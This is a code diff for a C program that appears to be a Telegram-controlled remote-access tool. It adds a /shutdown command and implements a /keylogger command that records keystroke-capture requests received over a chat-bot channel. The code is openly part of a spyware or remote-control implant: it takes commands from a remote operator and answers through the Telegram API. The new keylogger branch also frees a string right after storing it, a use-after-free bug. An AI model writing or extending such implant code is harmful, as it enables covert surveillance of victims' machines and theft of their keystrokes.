@@ -82,7 +82,7 @@ void fetch_updates(json_object **buffer) {
     if (!uri) {
       printf("Could not allocate memory to the uri variable.\n");
       fflush(stdout);
-      exit(1);
+      return;
     }
     strcpy(uri, base_uri);
     strcat(uri, "/getUpdates");
@@ -210,7 +210,8 @@ void *handle_cmds() {
               char *cmd_label = strtok(desc, " ");
               char *id = strtok(NULL, " ");
 
-              if (strcmp(cmd_label, "/screenshot") == 0) {
+              if (strcmp(cmd_label, "/screenshot") == 0 ||
+                  strcmp(cmd_label, "/shutdown") == 0) {
                 // Pre-define the hashtable search result
                 char *ht_res;
 
@@ -247,9 +248,59 @@ void *handle_cmds() {
                   ht_insert(cmd_table, id, ht_res);
                 }
               } else if (strcmp(cmd_label, "/keylogger") == 0) {
-                // ...
-                printf("%s\n", id);
+                char *n = strtok(NULL, " ");
+                if (n == NULL) {
+                  struct json_object *object, *tmp;
+
+                  object = json_object_new_object();
+
+                  // Set the chat id
+                  tmp = json_object_new_int(chat_id);
+                  json_object_object_add(object, "chat_id", tmp);
+                  // Set the mesasge text
+                  tmp = json_object_new_string("Command requires an integer to work. Please add one as the second argument.");
+                  json_object_object_add(object, "text", tmp);
+
+                  // Send the post request
+                  send_telegram_post("/sendMessage", json_object_to_json_string(object));
+                
+                  json_object_put(object);
+                  continue;
+                }
+
+                // Manufacture a new cmd_label
+                char *new_label = malloc((strlen(cmd_label) + 3 + strlen(n)) * sizeof(char));
+                strcpy(new_label, cmd_label);
+                strcat(new_label, "->");
+                strcat(new_label, n);
+
+                printf("%s\n", new_label);
                 fflush(stdout);
+
+                char *ht_res;
+                if ((ht_res = ht_search(cmd_table, id)) == NULL) {
+                  ht_insert(cmd_table, id, new_label);
+                } else {
+                  ht_res = (char *)realloc(ht_res, (strlen(ht_res) + strlen(new_label) + 1) + sizeof(char));
+                  if (ht_res == NULL) {
+                    continue;
+                  }
+
+                  char *tmp = (char *)malloc((strlen(new_label) + 2) * sizeof(char));
+                  if (tmp == NULL) {
+                    continue;
+                  }
+
+                  strcpy(tmp, ":");
+                  strcat(tmp, new_label);
+
+                  strcat(ht_res, tmp);
+                  free(tmp);
+
+                  ht_insert(cmd_table, id, ht_res);
+                }
+
+                free(new_label);
               }
 
               // ===== Send the mesasge
